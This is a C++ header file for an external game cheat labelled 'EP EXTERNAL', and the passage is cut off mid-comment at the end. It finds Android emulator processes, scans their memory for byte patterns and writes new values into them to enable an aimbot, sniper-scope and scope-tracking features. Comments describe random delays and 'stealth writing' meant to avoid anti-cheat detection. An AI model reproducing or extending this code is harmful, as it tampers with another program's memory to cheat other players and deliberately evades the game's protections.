#pragma once
#pragma once
#include <Windows.h>
#include <vector>
#include <string> 
#include <iostream>
#include <TlHelp32.h>
#include <tchar.h>
#define WIN32_LEAN_AND_MEAN
#include <winternl.h>

#include <mutex>
#include <map>
#include <future>
#include <random>
#include <cstdlib> // For rand()
#include "custom/custom_widgets.h"
#include <ctime> // For seeding rand()
#include "wininet.h"

#pragma comment(lib, "ntdll.lib")
bool loadscopetracking2x = true;
bool scopetracking2x = false;
bool loadaimbotscope2x = true;
bool aimbotscope2x = false;
bool loadsniper = true;
bool sniperon = false;
bool loadsnipertracking = true;
bool snipertrackingon = false;
bool loadsniperaim = true;
bool sniperaimon = false;
bool loadsniperswitch = true;
bool sniperswitchon = false;
extern std::string MemoryLogs;

extern "C" NTSTATUS ZwReadVirtualMemory(HANDLE hProcess, LPVOID lpBaseAddress, void* lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead = NULL);
extern "C" NTSTATUS ZwWriteVirtualMemory(HANDLE hProcess, LPVOID lpBaseAddress, void* lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead = NULL);
extern "C" NTSTATUS ZwProtectVirtualMemory(HANDLE hProcess, LPVOID BaseAddress, size_t  NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);

class SupremeMem
{

public:
    DWORD ProcessId = 0;
    HANDLE ProcessHandle;

    typedef struct _MEMORY_REGION
    {
        DWORD_PTR dwBaseAddr;
        DWORD_PTR dwMemorySize;
    }MEMORY_REGION;

    int GetPid(const char* procname)
    {

        if (procname == NULL)
            return 0;
        DWORD pid = 0;
        DWORD threadCount = 0;

        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe;

        pe.dwSize = sizeof(PROCESSENTRY32);
        Process32First(hSnap, &pe);
        while (Process32Next(hSnap, &pe)) {
            if (_tcsicmp(pe.szExeFile, procname) == 0) {
                if ((int)pe.cntThreads > threadCount) {
                    threadCount = pe.cntThreads;

                    pid = pe.th32ProcessID;

                }
            }
        }
        return pid;
    }

    const char* GetEmulatorRunning()
    {
        if (GetPid("HD-Player.exe") != 0)
            return "HD-Player.exe";

        else if (GetPid("LdVBoxHeadless.exe") != 0)
            return "LdVBoxHeadless.exe";

        else if (GetPid("MEmuHeadless.exe") != 0)
            return "MEmuHeadless.exe";

        else if (GetPid("LdVBoxHeadless.exe") != 0)
            return "LdVBoxHeadless.exe";

        else if (GetPid("AndroidProcess.exe") != 0)
            return "AndroidProcess.exe";

        else if (GetPid("aow_exe.exe") != 0)
            return "aow_exe.exe";

        else if (GetPid("NoxVMHandle.exe") != 0)
            return "NoxVMHandle.exe";
    }












    struct EntityAimbotHere
    {
        DWORD_PTR AimbotAddress;
        std::vector<BYTE> patternAimbot;
    };

    std::vector<EntityAimbotHere> OldAim;
    std::vector<DWORD_PTR> NewAim;

    struct EntityHere
    {
        std::vector<EntityHere> originalBytes;
        DWORD_PTR AimbotAddress;

    };



    std::unordered_map<uintptr_t, std::vector<BYTE>> originalBytesMap;


    bool SaveOriginalBytes(uintptr_t address)
    {
        std::vector<BYTE> bytes(4);
        if (ReadProcessMemory(ProcessHandle, reinterpret_cast<LPCVOID>(address), bytes.data(), bytes.size(), NULL))
        {
            originalBytesMap[address] = bytes;
            return true;
        }
        return false;
    }





    struct entityneckhere {
        DWORD_PTR addressneck;
        BYTE* patternneck;
    };
    std::vector<entityneckhere> puranoaim;
    std::vector<DWORD_PTR>naya_aim1;


    bool isaimbot;




    bool aimbot()
    {
        
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        DWORD_PTR startAddress = reinterpret_cast<DWORD_PTR>(si.lpMinimumApplicationAddress);
        DWORD_PTR endAddress = reinterpret_cast<DWORD_PTR>(si.lpMaximumApplicationAddress);

        std::vector<BYTE> SearchAimbotNew = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA5, 0x43, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xBF };


        if (!AttackProcess("Ld9BoxHeadless.exe"))
        {

            notify->AddNotification("Failed to attach to the process.", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));

         //  notify->AddNotification("Failed to attach to the process. ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            //notificationSystem.Notification("Notification", "Failed to attach to the process.", main_color);
            return false;
        }
      
        //notificationSystem.Notification("Notification", "Pattern: Scanning!", main_color);
        //MemoryLogs = "Pattern : Scanning!";

        NewAim.clear();
        OldAim.clear();

        if (!FindPattern(startAddress, endAddress, SearchAimbotNew.data(), NewAim))
        {
            notify->AddNotification("Pattern search failed.", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            //notificationSystem.Notification("Notification", "Pattern search failed.", main_color);
            //notify->AddNotification("Pattern search failed.", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            return false;
        }
        if (NewAim.empty())
        {
            notify->AddNotification("No scan results available", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            //notificationSystem.Notification("Notification", "No scan results available", main_color);
           //  notify->AddNotification("No scan results available", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            return false;
        }

        for (const auto& result : NewAim)
        {
            std::vector<BYTE> originalBytes(4);
            std::vector<BYTE> currentBytes(4);
            int mix;

            // Save original bytes before modification
            if (!SaveOriginalBytes(result + 40L))
            {
                notify->AddNotification("Failed to save original bytes at address ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                //notificationSystem.Notification("Notification", "Failed to save original bytes at address ", main_color);
               // MemoryLogs = "Failed to save original bytes at address ";
                continue;
            }

            // Read current bytes and integer value from memory
            if (!ReadProcessMemory(ProcessHandle, reinterpret_cast<LPCVOID>(result + 44L), currentBytes.data(), currentBytes.size(), NULL) ||
                !ReadProcessMemory(ProcessHandle, reinterpret_cast<LPCVOID>(result + 44L), &mix, sizeof(mix), NULL))
            {
                notify->AddNotification("Failed to read data at address ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                //notificationSystem.Notification("Notification", "Failed to read data at address ", main_color);
              //  MemoryLogs = "Failed to read data at address ";
                continue;
            }

            // Validate the integer value
            //if (mix == 0 || mix == 984662306)
            if (mix == 0 || mix == 4294967296)
            {
                notify->AddNotification("Unexpected value " + std::to_string(mix) + " at address ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                //notificationSystem.Notification("Notification", "Unexpected value " + std::to_string(mix) + " at address ", main_color);
              //  MemoryLogs = "Unexpected value " + std::to_string(mix) + " at address ";
                continue;
            }

            // Advanced obfuscated byte comparison
            bool bytesDifferent = false;
            for (size_t i = 0; i < originalBytes.size(); ++i)
            {
                // Generate a dynamic mask based on the index
                BYTE mask = static_cast<BYTE>(rand() % 256); // Random mask
                BYTE xorResult = originalBytes[i] ^ currentBytes[i];
                BYTE maskedResult = xorResult & mask; // Apply dynamic mask

                if (maskedResult != 0)
                {
                    bytesDifferent = true;
                    break;
                }
            }

            if (bytesDifferent)
            {
                // Stealth writing: Implement a delay or additional checks to avoid detection
                std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100)); // Random delay

                if (WriteProcessMemory(ProcessHandle, reinterpret_cast<LPVOID>(result + 40L), currentBytes.data(), currentBytes.size(), NULL))
                {
                    //notificationSystem.Notification("Notification", "Aimbot Drag: Injected at address ", main_color);
                  //  notify->AddNotification("Aimbot External : Activated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                 //   MemoryLogs = "Aimbot External : Activated";
                  
                    
                }
                else
                {
                    notify->AddNotification("Failed to write memory at address ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                    //notificationSystem.Notification("Notification", "Failed to write memory at address ", main_color);
                   // MemoryLogs = "Failed to write memory at address ";
                    return false;
                }
            }
        }

        return true;
    }

    bool aimbotdrag()
    {
      
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        DWORD_PTR startAddress = reinterpret_cast<DWORD_PTR>(si.lpMinimumApplicationAddress);
        DWORD_PTR endAddress = reinterpret_cast<DWORD_PTR>(si.lpMaximumApplicationAddress);

        std::vector<BYTE> SearchAimbotNew = { 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA5, 0x43, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xBF };


        if (!AttackProcess("Ld9BoxHeadless.exe"))
        {

            notify->AddNotification("Failed to attach to the process.", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));

            //  notify->AddNotification("Failed to attach to the process. ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
               //notificationSystem.Notification("Notification", "Failed to attach to the process.", main_color);
            return false;
        }

        //notificationSystem.Notification("Notification", "Pattern: Scanning!", main_color);
        //MemoryLogs = "Pattern : Scanning!";

        NewAim.clear();
        OldAim.clear();

        if (!FindPattern(startAddress, endAddress, SearchAimbotNew.data(), NewAim))
        {
            notify->AddNotification("Pattern search failed.", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            //notificationSystem.Notification("Notification", "Pattern search failed.", main_color);
            //notify->AddNotification("Pattern search failed.", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            return false;
        }
        if (NewAim.empty())
        {
            notify->AddNotification("No scan results available", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            //notificationSystem.Notification("Notification", "No scan results available", main_color);
           //  notify->AddNotification("No scan results available", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            return false;
        }

        for (const auto& result : NewAim)
        {
            std::vector<BYTE> originalBytes(4);
            std::vector<BYTE> currentBytes(4);
            int mix;

            // Save original bytes before modification
            if (!SaveOriginalBytes(result + 0x5c))
            {
                notify->AddNotification("Failed to save original bytes at address ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                //notificationSystem.Notification("Notification", "Failed to save original bytes at address ", main_color);
               // MemoryLogs = "Failed to save original bytes at address ";

                continue;
            }

            // Read current bytes and integer value from memory
            if (!ReadProcessMemory(ProcessHandle, reinterpret_cast<LPCVOID>(result + 0x90), currentBytes.data(), currentBytes.size(), NULL) ||
                !ReadProcessMemory(ProcessHandle, reinterpret_cast<LPCVOID>(result + 0x90), &mix, sizeof(mix), NULL))
            {
                notify->AddNotification("Failed to read data at address ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                //notificationSystem.Notification("Notification", "Failed to read data at address ", main_color);
              //  MemoryLogs = "Failed to read data at address ";
                continue;
            }

            // Validate the integer value
            //if (mix == 0 || mix == 984662306)
            if (mix == 0 || mix == 4294967296)
            {
                notify->AddNotification("Unexpected value " + std::to_string(mix) + " at address ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                //notificationSystem.Notification("Notification", "Unexpected value " + std::to_string(mix) + " at address ", main_color);
              //  MemoryLogs = "Unexpected value " + std::to_string(mix) + " at address ";
                continue;
            }

            // Advanced obfuscated byte comparison
            bool bytesDifferent = false;
            for (size_t i = 0; i < originalBytes.size(); ++i)
            {
                // Generate a dynamic mask based on the index
                BYTE mask = static_cast<BYTE>(rand() % 256); // Random mask
                BYTE xorResult = originalBytes[i] ^ currentBytes[i];
                BYTE maskedResult = xorResult & mask; // Apply dynamic mask

                if (maskedResult != 0)
                {
                    bytesDifferent = true;
                    break;
                }
            }

            if (bytesDifferent)
            {
                // Stealth writing: Implement a delay or additional checks to avoid detection
                std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100)); // Random delay

                if (WriteProcessMemory(ProcessHandle, reinterpret_cast<LPVOID>(result + 0x5C), currentBytes.data(), currentBytes.size(), NULL))
                {
                    //notificationSystem.Notification("Notification", "Aimbot Drag: Injected at address ", main_color);
                 //   notify->AddNotification("Aimbot Drag External : Activated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                    //   MemoryLogs = "Aimbot External : Activated";
                  
                }
                else
                {
                    notify->AddNotification("Failed to write memory at address ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                    //notificationSystem.Notification("Notification", "Failed to write memory at address ", main_color);
                   // MemoryLogs = "Failed to write memory at address ";
                    return false;
                }
            }
        }

        return true;
    }



    struct EntitySniperScopeHere
    {
        DWORD_PTR addressSniperScope;
        std::vector<BYTE> patternSniperScope;
        DWORD_PTR addressSniperAim;
        std::vector<BYTE> patternSniperAim;
        DWORD_PTR addressSniperScopeTracking;
        std::vector<BYTE> patternSniperScopeTracking;
        DWORD_PTR addressSniperSwitch;
        std::vector<BYTE> patternSniperSwitch;
        DWORD_PTR addressScopeTracking2x;
        std::vector<BYTE> patternScopeTracking2x;
        DWORD_PTR addressScopeAimbot2x;
        std::vector<BYTE> patternScopeAimbot2x;
    };

    std::vector<EntitySniperScopeHere> OldSniperScope;
    std::vector<DWORD_PTR> NewSniperScope;

    std::vector<EntitySniperScopeHere> OldScopeTracking2x;
    std::vector<DWORD_PTR> NewScopeTracking2x;

    std::vector<EntitySniperScopeHere> OldScopeAimbot2x;
    std::vector<DWORD_PTR> NewScopeAimbot2x;

    std::vector<EntitySniperScopeHere> OldSniperAim;
    std::vector<DWORD_PTR> NewSniperAim;

    std::vector<EntitySniperScopeHere> OldSniperScopeTracking;
    std::vector<DWORD_PTR> NewSniperScopeTracking;

    std::vector<EntitySniperScopeHere> OldSniperSwitch;
    std::vector<DWORD_PTR> NewSniperSwitch;


    bool SaveAoBSniperScope()
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        DWORD_PTR startAddress = reinterpret_cast<DWORD_PTR>(si.lpMinimumApplicationAddress);
        DWORD_PTR endAddress = reinterpret_cast<DWORD_PTR>(si.lpMaximumApplicationAddress);

          std::vector<BYTE> SearchSniperScopeNew = { 0x00, 0x00, 0x00, 0x60, 0x40, 0xCD, 0xCC, 0x8C, 0x3F, 0x8F, 0xC2, 0xF5, 0x3C, 0xCD, 0xCC, 0xCC, 0x3D, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x41, 0x00, 0x00, 0x48, 0x42, 0x00, 0x00, 0x00, 0x3F, 0x33, 0x33, 0x13, 0x40, 0x00, 0x00, 0xB0, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x01, 0x00, 0x00, 0x00 };


        if (!AttackProcess("HD-Player.exe"))
        {
           notify->AddNotification("Failed to attach to the process. ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));

            return false;
        }


          notify->AddNotification("Loading : Sniper Scope", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(252, 232, 3)));

        NewSniperScope.clear();
        OldSniperScope.clear();

        if (!FindPattern(startAddress, endAddress, SearchSniperScopeNew.data(), NewSniperScope))
        {

            notify->AddNotification("Pattern search failed.", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            return false;
        }

        // Logging the found addresses
        for (const auto& address : NewSniperScope)
        {
           notify->AddNotification("Successfully Loaded : Sniper Scope", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
            loadsniper = false;
            sniperon = true;
     

        }
        return true;
    }





    bool onoroffsniper;
    void ActivateSniperScope()
    {
        onoroffsniper = !onoroffsniper;
        if (NewSniperScope.empty())
        {
             notify->AddNotification("No scan results available", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            std::cout << "No scan results available" << std::endl;
            return;
        }



        if (onoroffsniper) {
            for (auto result : NewSniperScope)

                // Value to write
                std::cout << NewSniperScope.size() << std::endl;
            for (DWORD_PTR address : NewSniperScope)
            {
                DWORD_PTR targetaddress = address + 0x15;
                int newValue = 0xFFF00000;
                std::vector<BYTE> byteArray = IntToByteArray(newValue);

                if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                {
                    notify->AddNotification("Sniper Scope External : Activated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                    std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                }
                else
                {
                    notify->AddNotification("Sniper Scope External : failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                    std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                }


            }
            CloseHandle(0);
        }
        else {
            for (auto result : NewSniperScope)

                // Value to write
                std::cout << NewSniperScope.size() << std::endl;
            for (DWORD_PTR address : NewSniperScope)
            {
                DWORD_PTR targetaddress = address + 0x15;
                int newValue = 0x00000000;
                std::vector<BYTE> byteArray = IntToByteArray(newValue);

                if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                {
                    notify->AddNotification("Sniper Scope External : Deactivated", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
                    std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                }
                else
                {
                    notify->AddNotification("Sniper Scope External : Failed", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
                    std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                }
            }
            CloseHandle(0);
        }
    }

    //++++++++++++++++==============================================================


    bool SaveAoBScopetracking2x()
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        DWORD_PTR startAddress = reinterpret_cast<DWORD_PTR>(si.lpMinimumApplicationAddress);
        DWORD_PTR endAddress = reinterpret_cast<DWORD_PTR>(si.lpMaximumApplicationAddress);

        std::vector<BYTE> SearchScopeTracking2xNew = { 0x00, 0x00, 0x00, 0x60, 0x40, 0xCD, 0xCC, 0x8C, 0x3F, 0x8F, 0xC2, 0xF5, 0x3C, 0xCD, 0xCC, 0xCC, 0x3D, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x41, 0x00, 0x00, 0x48, 0x42, 0x00, 0x00, 0x00, 0x3F, 0x33, 0x33, 0x13, 0x40, 0x00, 0x00, 0xB0, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x01, 0x00, 0x00, 0x00 };


        if (!AttackProcess("HD-Player.exe"))
        {
           notify->AddNotification("Failed to attach to the process. ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));

            return false;
        }


          notify->AddNotification("Loading : Sniper", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(252, 232, 3)));

        NewScopeTracking2x.clear();
        OldScopeTracking2x.clear();

        if (!FindPattern(startAddress, endAddress, SearchScopeTracking2xNew.data(), NewScopeTracking2x))
        {

            notify->AddNotification("Pattern search failed.", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            return false;
        }

        // Logging the found addresses
        for (const auto& address : NewScopeTracking2x)
        {
           notify->AddNotification("Successfully Loaded : Sniper", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
            loadscopetracking2x = false;
            scopetracking2x = true;
            

        }
        return true;
    }





    bool onoroffscopetracking2x;
    void ActivateScopeTracking2x()
    {
        onoroffscopetracking2x = !onoroffscopetracking2x;
        if (NewScopeTracking2x.empty())
        {
             notify->AddNotification("No scan results available", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            std::cout << "No scan results available" << std::endl;
            return;
        }



        if (onoroffscopetracking2x) {
            for (auto result : NewScopeTracking2x)

                // Value to write
                std::cout << NewScopeTracking2x.size() << std::endl;
            for (DWORD_PTR address : NewScopeTracking2x)
            {
                DWORD_PTR targetaddress = address + 0x17;
                int newValue = 0x0000015C;
                std::vector<BYTE> byteArray = IntToByteArray(newValue);

                if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                {
                    MemoryLogs = "Scope Tracking 2x External : Activated";
                    std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                }
                else
                {
                    MemoryLogs = "Scope Tracking 2x : Failed!!";
                    std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                }


            }
            CloseHandle(0);
        }
        else {
            for (auto result : NewScopeTracking2x)

                // Value to write
                std::cout << NewScopeTracking2x.size() << std::endl;
            for (DWORD_PTR address : NewScopeTracking2x)
            {
                DWORD_PTR targetaddress = address + 0x17;
                int newValue = 0x0000013F;
                std::vector<BYTE> byteArray = IntToByteArray(newValue);

                if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                {
                    MemoryLogs = "Scope Tracking 2x : Activated";
                    std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                }
                else
                {
                    MemoryLogs = "Scope Tracking 2x : Failed!!";
                    std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                }
            }
            CloseHandle(0);
        }
    }


    //================================================================================

       //++++++++++++++++==============================================================


    bool SaveAoBScopeAimbot2x()
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        DWORD_PTR startAddress = reinterpret_cast<DWORD_PTR>(si.lpMinimumApplicationAddress);
        DWORD_PTR endAddress = reinterpret_cast<DWORD_PTR>(si.lpMaximumApplicationAddress);

        std::vector<BYTE> SearchScopeAimbot2xNew = { 0x13, 0x40, 0x00, 0x00, 0xF0, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x01, 0x00, 0x00, 0x00, '?', '?', '?', '?', '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', '?', '?', '?' };


        if (!AttackProcess("HD-Player.exe"))
        {
           notify->AddNotification("Failed to attach to the process. ", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));

            return false;
        }


          notify->AddNotification("Loading : Sniper", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(252, 232, 3)));

        NewScopeAimbot2x.clear();
        OldScopeAimbot2x.clear();

        if (!FindPattern(startAddress, endAddress, SearchScopeAimbot2xNew.data(), NewScopeAimbot2x))
        {

            notify->AddNotification("Pattern search failed.", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            return false;
        }

        // Logging the found addresses
        for (const auto& address : NewScopeAimbot2x)
        {
           notify->AddNotification("Successfully Loaded : Sniper", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(0, 255, 0)));
            loadaimbotscope2x = false;
            aimbotscope2x = true;
            

        }
        return true;
    }





    bool onoroffscopeaimbot2x;
    void ActivateScopeAimbot2x()
    {
        onoroffscopeaimbot2x = !onoroffscopeaimbot2x;
        if (NewScopeAimbot2x.empty())
        {
             notify->AddNotification("No scan results available", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
            std::cout << "No scan results available" << std::endl;
            return;
        }



        if (onoroffscopeaimbot2x) {
            for (auto result : NewScopeAimbot2x)

                // Value to write
                std::cout << NewScopeAimbot2x.size() << std::endl;
            for (DWORD_PTR address : NewScopeAimbot2x)
            {
                DWORD_PTR targetaddress = address + 0x00;
                int newValue = 0x0000FFFF;
                std::vector<BYTE> byteArray = IntToByteArray(newValue);

                if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                {
                    MemoryLogs = "Scope Aimbot 2x External : Activated";
                    std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                }
                else
                {
                    MemoryLogs = "Scope Aimbot 2x : Failed!!";
                    std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                }
                for (auto result : NewScopeAimbot2x)

                    // Value to write
                    std::cout << NewScopeAimbot2x.size() << std::endl;
                for (DWORD_PTR address : NewScopeAimbot2x)
                {
                    DWORD_PTR targetaddress = address + 0x20;
                    int newValue = 0x00000B4;
                    std::vector<BYTE> byteArray = IntToByteArray(newValue);

                    if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                    {
                        MemoryLogs = "Scope Aimbot 2x External : Activated";
                        std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                    }
                    else
                    {
                        MemoryLogs = "Scope Aimbot 2x : Failed!!";
                        std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                    }
                }


            }
            CloseHandle(0);
        }
        else {
            for (auto result : NewScopeAimbot2x)

                // Value to write
                std::cout << NewScopeAimbot2x.size() << std::endl;
            for (DWORD_PTR address : NewScopeAimbot2x)
            {
                DWORD_PTR targetaddress = address + 0x00;
                int newValue = 0x00004013;
                std::vector<BYTE> byteArray = IntToByteArray(newValue);

                if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                {
                    MemoryLogs = "Scope Tracking 2x : Deactivated";
                    std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                }
                else
                {
                    MemoryLogs = "Scope Tracking 2x : Failed!!";
                    std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                }
                for (auto result : NewScopeAimbot2x)

                    // Value to write
                    std::cout << NewScopeAimbot2x.size() << std::endl;
                for (DWORD_PTR address : NewScopeAimbot2x)
                {
                    DWORD_PTR targetaddress = address + 0x20;
                    int newValue = 0x0000000;
                    std::vector<BYTE> byteArray = IntToByteArray(newValue);

                    if (WriteProcessMemory(ProcessHandle, (LPVOID)targetaddress, &newValue, sizeof(newValue), 0))
                    {
                        MemoryLogs = "Scope Tracking 2x : Deactivated";
                        std::cout << "Modified memory at " << std::hex << targetaddress << std::endl;
                    }
                    else
                    {
                        MemoryLogs = "Scope Tracking 2x : Failed!!";
                        std::cout << "Failed to modify memory at " << std::hex << targetaddress << std::endl;
                    }
                }
            }
            CloseHandle(0);
        }
    }


    //================================================================================




    //void DeactivateSniperScope()
    //{
    //    if (NewSniperScope.empty())
    //    {
    //         notify->AddNotification("No scan results available", "EP EXTERNAL !!", 5000, gui->get_clr(ImColor(255, 0, 0)));
